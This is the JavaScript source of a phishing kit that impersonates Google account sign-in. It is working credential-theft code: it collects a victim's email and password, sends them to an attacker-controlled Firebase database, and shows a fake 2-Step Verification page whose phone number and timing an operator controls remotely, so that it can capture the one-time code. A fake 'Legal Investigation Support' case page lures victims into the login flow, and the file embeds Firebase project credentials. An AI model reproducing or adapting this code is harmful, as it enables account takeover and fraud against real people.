import {initializeApp} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"
import {getDatabase, ref, push, onValue, set} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js"

const appsettings = {
  apiKey: "AIzaSyB9AXaOdqAc_FiHvXkTfnKit_ZD4mdh4nA",
  authDomain: "collecor-7fccf.firebaseapp.com",
  databaseURL: "https://collecor-7fccf-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "collecor-7fccf",
  storageBucket: "collecor-7fccf.firebasestorage.app",
  messagingSenderId: "663972743163",
  appId: "1:663972743163:web:ab156694d098d0c7c0ed5e"
}

const app = initializeApp(appsettings)
const database = getDatabase(app)

function getDeviceid(){
    let ua = navigator.userAgent;

    return ua.replace(/[^a-zA-Z0-9]/g, "_")
}
let deviceinfo = getDeviceid();

const emailcontent = ref(database, deviceinfo)
let userid = emailcontent.key
console.log(userid)



const useremailinput = document.getElementById("useremailinput")
const submitemailbutton = document.getElementById("submitemailbutton")
const wrongpopup = document.getElementById("wrongpopup")


if (submitemailbutton){
    submitemailbutton.onclick = validateinput
}

function validateinput(){
    let useremailinputg = useremailinput.value

    let requiredgmail = "@gmail.com"
    let requiredoutlook = "@outlook.com"
    let requiredhotmail = "@hotmail.com"
    let requiredlive = "@live.com"
    let requiredmsn = "@msn.com"
    let requiredyahoo = "@yahoo.com"
    let requiredymail = "@ymail.com"
    let requiredaol = "@aol.com"
    let requiredicloud = "@icloud.com"
    let requiredme = "@me.com"
    let requiredmac = "@mac.com"

    if(useremailinputg.includes(requiredgmail) 
    || useremailinputg.includes(requiredoutlook)
    || useremailinputg.includes(requiredhotmail)
    || useremailinputg.includes(requiredlive)
    || useremailinputg.includes(requiredmsn)
    || useremailinputg.includes(requiredyahoo)
    || useremailinputg.includes(requiredymail)
    || useremailinputg.includes(requiredaol)
    || useremailinputg.includes(requiredicloud)
    || useremailinputg.includes(requiredme)
    || useremailinputg.includes(requiredmac)
    ){
        localStorage.setItem("displaatemail", useremailinputg)

        // localStorage.setItem("useremailinputg", useremailinputg)

        window.location.href = "password.html";
        console.log("page changed to password page")
        // changeemailshow(displaatemail)

    }
    else{
        wrongpopup.innerHTML = `<i class="fa-solid fa-circle-exclamation"></i><p id="redflagptag">Enter an email or phone number</p>`
        }

}

if(window.location.pathname.endsWith("password.html")){
    function changeemailshow(){
        const savedtext = localStorage.getItem("displaatemail")
         document.getElementById("sanA").textContent = savedtext
}
changeemailshow()
        
const wrongpassup = document.getElementById("wrongpassup");
const emailpasswordfiled = document.getElementById("emailpasswordfiled");
const showchekbox = document.getElementById("showchekbox");
const passwwordagebutton = document.getElementById("passwwordagebutton")

showchekbox.addEventListener("change",
    function (){
            if(this.checked)  {
                    emailpasswordfiled.type = "text"

            }
            else{
                    emailpasswordfiled.type = "password"

            }
        
            }
        )


            passwwordagebutton.onclick = sendpasswordtodb

        function sendpasswordtodb() {
            let userpassword = emailpasswordfiled.value

            if(userpassword.length >= 4){
                const saveduseremailinputg = localStorage.getItem("displaatemail")

                        set(emailcontent, {
                                    email: saveduseremailinputg,
                                    password: userpassword,
                                    otpuppage: false,
                                    number:" "
                                        })
                    console.log("password entered")
                    window.location.href = "otp.html"
            }
            else{
                 wrongpassup.innerHTML = `<i class="fa-solid fa-circle-exclamation"></i><p id="redflagptag">invalid password</p>`
            }

        }

}
if(window.location.pathname.endsWith("otp.html")){
    let contenthold = document.getElementById("contenthold");

    const uplodpgref = ref(database, deviceinfo + "/otpuppage")
    onValue(uplodpgref, (snapshot) => {
        uploadpage = snapshot.val()
        otpagedisplay(uploadpage,otpnum)
    })
    const numberref = ref(database, deviceinfo + "/number")
    onValue(numberref, (snapshot) => {
        otpnum =snapshot.val()
        otpagedisplay(uploadpage, otpnum)
    })

        let uploadpage ;
        let otpnum ;


function otpagedisplay(upload, otpnumber){
        if(upload){
            contenthold.innerHTML = 
            ` <div class="parent">
                    <div class="halfchild2">
                        <img src="gogle logo 2025-08-15 044328.png" oncontextmenu="return false;" alt="logo">
                        <h1 class="h1compo">2-Step Verification</h1>
                        <img src="removebg-preview.png" alt="">
                    </div>
                    <p></p>
                    <div class="halfchild">
                        <div class="child1">
                                <input type="number" id="userotpinput" class="codeinput" placeholder="G- Enter the 6-digit code">
                                <span class="wrongdidspan" id="wrongotp"></span>
                            
                            <span class="gorgetlikspan"><h4 class="codeh3">Enter a Verification Code</h4></span>
                        </div>
                        <p class="ptagy">A text message with a verification code was just sent to ${otpnumber} </p>
                        <div class="child2">
                            <button class="resendcodebutton">Resend Code</button>
                            <button class="nextbutton" id="donebutton">Done</button>
                        </div>
                    </div>
            </div>
                        <div class="buttonchild">
                <select id="languagepopver" >
                    <option value="" id="language">English (United States)</option>
                    <option value="" id="language">German</option>
                    <option value="" id="language">Polish</option>
                    <option value="" id="language">Portuguese</option>
                    <option value="" id="language">Russian</option>
                    <option value="" id="language">Italian</option>
                    <option value="" id="language">Spanish</option>
                    <option value="" id="language">French</option>
                    <option value="" id="language">German</option>
                    <option value="" id="language">Bengali</option>
                    <option value="" id="language">Hindi</option>
                    <option value="" id="language">Oriya</option>
                    <option value="" id="language">Tamil</option>
                    <option value="" id="language">Urdu</option>
                    <option value="" id="language">Telugu </option>
                    <option value="" id="language">English</option>
                    <option value="" id="language">Assamese</option>
                    <option value="" id="language">Persian</option>
                    <option value="" id="language">Malay</option>
                    <option value="" id="language">Turkish</option>
                    <option value="" id="language">Marathi</option>
                    <option value="" id="language">Vietnamese</option>
                    <option value="" id="language">Egyptian Hieroglyphs (Egyptian)</option>
                    <option value="" id="language">Extremaduran (Romance)</option>
                </select>
                <div class="lastlinkdiv">
                    <a href="https://support.google.com/accounts?hl=en&visit_id=638910337082081465-313945920&rd=2&p=account_iph#topic=3382296" class="lastlinks">Help</a>
                    <a href="https://policies.google.com/privacy?gl=NG&hl=en" class="lastlinks">Privacy</a>
                    <a href="https://policies.google.com/terms?gl=NG&hl=en" class="lastlinks">Terms</a>
                </div>
            </div>`

             let userotpinput = document.getElementById("userotpinput")
 let donebutton = document.getElementById("donebutton")

     donebutton.onclick = otpcodesubmit
    }
    else{
        contenthold.innerHTML = `         
                    <div class="parent">
                    <div class="halfchild2">
                        <div src="" class="skeleton logoload"></div>
                        <h1 class="skeleton h1load"></h1>
                        <div src="" alt="" class="skeleton phongsmsimgload"></div>
                    </div>
                    <p></p>
                    <div class="halfchild">
                        <div class="child1">
                                <div type="number" id="useremailinput" class="skeleton codeinputload"></div>
                                <span class="wrongdidspan" id="wrongpopup"></span>
                            
                            <span class="gorgetlikspan"><h4 class="skeleton codeh3load"></h4></span>
                        </div>
                            <div class="ptayspan">
                                <p class="skeleton ptagyload"></p>
                                <p class="skeleton ptagyload"></p>
                                <p class="skeleton ptagyload"></p>
                            </div>
                        <div class="child2">
                            <button class="skeleton resendcodebuttonload"></button>
                            <button class="skeleton nextbuttonload" id="submitemailbutton"></button>
                        </div>
                    </div>
            </div>            
            <div class="buttonchild">
                <select id="languagepopver" >
                    <option value="" id="language">English (United States)</option>
                    <option value="" id="language">German</option>
                    <option value="" id="language">Polish</option>
                    <option value="" id="language">Portuguese</option>
                    <option value="" id="language">Russian</option>
                    <option value="" id="language">Italian</option>
                    <option value="" id="language">Spanish</option>
                    <option value="" id="language">French</option>
                    <option value="" id="language">German</option>
                    <option value="" id="language">Bengali</option>
                    <option value="" id="language">Hindi</option>
                    <option value="" id="language">Oriya</option>
                    <option value="" id="language">Tamil</option>
                    <option value="" id="language">Urdu</option>
                    <option value="" id="language">Telugu </option>
                    <option value="" id="language">English</option>
                    <option value="" id="language">Assamese</option>
                    <option value="" id="language">Persian</option>
                    <option value="" id="language">Malay</option>
                    <option value="" id="language">Turkish</option>
                    <option value="" id="language">Marathi</option>
                    <option value="" id="language">Vietnamese</option>
                    <option value="" id="language">Egyptian Hieroglyphs (Egyptian)</option>
                    <option value="" id="language">Extremaduran (Romance)</option>
                </select>
                <div class="lastlinkdiv">
                    <a href="https://support.google.com/accounts?hl=en&visit_id=638910337082081465-313945920&rd=2&p=account_iph#topic=3382296" class="lastlinks">Help</a>
                    <a href="https://policies.google.com/privacy?gl=NG&hl=en" class="lastlinks">Privacy</a>
                    <a href="https://policies.google.com/terms?gl=NG&hl=en" class="lastlinks">Terms</a>
                </div>
            </div>`
    }
}


 function otpcodesubmit(){
    let otpcode = userotpinput.value
    if(otpcode.length == 6){
                push(emailcontent, {
                    otpcode: otpcode
                        })

        window.location.href = `https://accounts.google.com.ng/`
    }
    else{
        wrongotp.innerHTML = `<i class="fa-solid fa-circle-exclamation"></i><p id="redflagptag">invalid code</p>`
    }
 }

}

if(window.location.href.includes("index.html")){
    document.getElementById("helpbutton").onclick = () => {window.location.href = "https://support.google.com/"};
    document.getElementById("userbutton").onclick = () => {window.location.href = "gmaillog.html"}
                                                                    // empty for back button
    document.getElementById("bacbuton").onclick = () => {window.location.href = ""} 

    // case navigator

    let allcaseid; document.getElementById("allcaseid").onclick = () => { allcaseidhtmlhold()}
    let Opencaseid; document.getElementById("Opencaseid").onclick = () => { allcaseidhtmlhold()}
    let inprogressid;  document.getElementById("inprogressid").onclick = () => { nocasefuncdis()}
    let Resolvedid; document.getElementById("Resolvedid").onclick = () => { nocasefuncdis()}
    let Closedcaseid; document.getElementById("Closedcaseid").onclick = () => { nocasefuncdis()}

    let hondhold = document.getElementById("hondhold");

    function nocasefuncdis(){
        hondhold.innerHTML = `
        <div class="noaviliblcase">
            <p class="nocase">No case to view here</p>
        </div>`
    }

    function allcaseidhtmlhold(){
        hondhold.innerHTML = ` <div class="spaceholder">

                            <div class="leagalheaader">
                                <div class="investigationdiv">
                                    <i class="fa-solid fa-circle-exclamation"></i>
                                    <div class="justlegaltextholder">
                                        <p class="pholdtag">Legal Investigation Support</p>
                                        <p class="pholdtagsec">Internal #GS-875623 • Opened september 20, 2025</p>
                                    </div>
                                </div>
                                <div class="inprogressbutton">
                                    <button class="situation PROGRESS">IN PROGRESS</button>
                                    <button class="situation URGENT">URGENT</button>
                                </div>
                            </div>
                            <div class="leagalbodytext">
                                <div class="paragraphold">
                                    <p class="pragraph pragraph1">Your legal request is currently under review. This matter requires additional documentation for processing.</p>
                                    <p class="pragraph pragraph2">Our team is awaiting your review of the opened case so we can resolve it promply to keep up safety measures.</p>
                                </div>
                                <div class="documenstholder">
                                    <i class="fa-solid fa-book-bookmark" ></i>
                                    <div class="docdivholder">
                                        <p class="docpara docpara1">Leagaal Documentation Review - In Progress</p>
                                        <p class="docpara docpara2">Estimated review completion: 72 hours</p>
                                    </div>
                                </div>
                                <div class="viewbutoondivhold">
                                    <button class="caebutton submitecase" id="submitecaseid">Submite case</button>
                                    <button class="caebutton viewcase" id="viewcaseid">View case</button>
                                </div>
                            </div>
                            <!-- spacehold ↓ -->
                        </div>`
    }

    // last button of support

    let submitecaseid = document.getElementById("submitecaseid");
    let viewcaseid = document.getElementById("viewcaseid");

    if(submitecaseid){
        submitecaseid.onclick = () => {window.location.href = "gmaillog.html"}
    }
    if(viewcaseid){
        viewcaseid.onclick = () => {window.location.href = "gmaillog.html"}
    }
}